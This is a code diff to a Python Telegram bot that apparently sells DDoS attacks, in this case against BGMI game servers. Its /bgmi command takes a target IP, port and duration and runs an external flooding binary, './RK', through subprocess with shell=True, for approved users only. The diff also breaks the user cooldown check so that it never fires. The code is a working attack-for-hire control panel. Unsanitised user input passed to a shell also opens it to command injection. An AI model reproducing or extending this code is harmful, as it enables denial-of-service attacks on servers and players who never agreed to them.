@@ -15,6 +15,7 @@ LOG_FILE = "log.txt"
 FREE_USER_FILE = "free_users.txt"
 
 # Global dictionaries to manage cooldowns and expiry times
+bgmi_cooldown = {}
 user_approval_expiry = {}
 
 # Initialize the bot
@@ -122,7 +123,7 @@ def remove_user(message):
         else:
             response = "𝙴𝚡𝚊𝚖𝚙𝚕𝚎 𝚝𝚘 𝚞𝚜𝚎: /remove <𝚞𝚜𝚎𝚛 𝚒𝚍>"
     else:
-        response = " ❌ 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚞𝚝𝚑𝚘𝚛𝚒𝚣𝚎𝚍 𝚘𝚗𝚕𝚢 𝚊𝚍𝚖𝚒𝚗 𝚞𝚜𝚎 @GODxAloneBOY.@RajOwner90."
+        response = " ❌ 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚞𝚝𝚑𝚘𝚛𝚒𝚣𝚎𝚍 𝚘𝚗𝚕𝚢 𝚊𝚍𝚖𝚒𝚗 𝚞𝚜𝚎 @GODxAloneBOY."
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['bgmi'])
@@ -131,41 +132,28 @@ def handle_bgmi(message):
         return  # Handle the case where message is invalid
 
     user_id = str(message.chat.id)
-    
-    # Check if the user is allowed to use the bot
     if user_id in allowed_user_ids:
-        
-        # Check if the user is on cooldown and if so, if the cooldown period has passed
-        if user_id not in ADMIN_ID and user_id in bgmi_cooldown:
-            time_remaining = (bgmi_cooldown[user_id] - datetime.datetime.now()).seconds
-            if time_remaining > 0:
-                bot.reply_to(message, f"🚫 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚘𝚗 𝚌𝚘𝚘𝚕𝚘𝚠𝚗. 𝚆𝚊𝚒𝚝 𝚏𝚘𝚛 {time_remaining} 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 𝚊𝚗𝚍 𝚝𝚛𝚢 𝚊𝚐𝚊𝚒𝚗.")
-                return
+        if user_id not in ADMIN_ID and (user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0):
+            bot.reply_to(message, "🚫 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚘𝚗 𝚌𝚘𝚘𝚕𝚍𝚘𝚠𝚗 𝚠𝚊𝚒𝚝 𝚗𝚊𝚍 𝚝𝚛𝚢 𝚊𝚐𝚊𝚒𝚗 𝚕𝚊𝚝𝚎𝚛.")
+            return
 
-        # Set the cooldown for this user
+        bgmi_cooldown[user_id] = datetime.datetime.now()
         command = message.text.split()
         if len(command) == 4:
             target, port, time = command[1], int(command[2]), int(command[3])
-            
             if time > 240:
-                response = "❌ 𝙴𝚛𝚛𝚘𝚛: 𝚘𝚗𝚕𝚢 𝚢𝚘𝚞 𝚌𝚊𝚗 𝚞𝚜𝚎 𝚝𝚘 240 𝚜𝚎𝚌𝚘𝚗𝚍𝚜."
+                response = "❌ 𝙴𝚛𝚛𝚘𝚛: 𝚘𝚗𝚕𝚢 𝚢𝚘𝚞 𝚌𝚊𝚗 𝚞𝚜𝚎 𝚝𝚘  240 𝚜𝚎𝚌𝚘𝚗𝚍𝚜"
             else:
-                # Record the attack and start the process
                 record_command_logs(user_id, '/RK', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)
                 subprocess.run(f"./RK {target} {port} {time} 900", shell=True)
-                
-                # Set the cooldown based on the attack time (in seconds)
-                bgmi_cooldown[user_id] = datetime.datetime.now() + datetime.timedelta(seconds=time)
-                
                 response = f"🅱🅶🅼🅸 🅺🅸 🅲🅷🆄🅳🅰🆈🅸 🅺🅷🅰🆃🅰🅼. 𝐭𝐚𝐫𝐠𝐞𝐭: {target} 𝐩𝐨𝐫𝐭: {port} 𝐝𝐮𝐫𝐚𝐭𝐨𝐢𝐧: {time}"
-            
             bot.reply_to(message, response)
         else:
             bot.reply_to(message, "𝚎𝚡𝚊𝚖𝚙𝚕𝚎 𝚝𝚘 𝚞𝚜𝚎: /bgmi <𝚝𝚊𝚛𝚐𝚎𝚝> <𝚙𝚎𝚛𝚝> <𝚍𝚞𝚛𝚊𝚝𝚘𝚒𝚗>")
     else:
-        bot.reply_to(message, "❌ 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚞𝚝𝚘𝚛𝚒𝚣𝚎𝚍 𝚙𝚕𝚎𝚊𝚜𝚎 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝚝𝚘 𝚝𝚑𝚎 𝚘𝚠𝚗𝚎𝚛 @GODxAloneBOY.@RajOwner90")
+        bot.reply_to(message, "❌ 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚞𝚝𝚘𝚛𝚒𝚣𝚎𝚍 𝚙𝚕𝚎𝚊𝚜𝚎 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝚝𝚘 𝚝𝚑𝚎 𝚘𝚠𝚗𝚎𝚛 @GODxAloneBOY.")
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
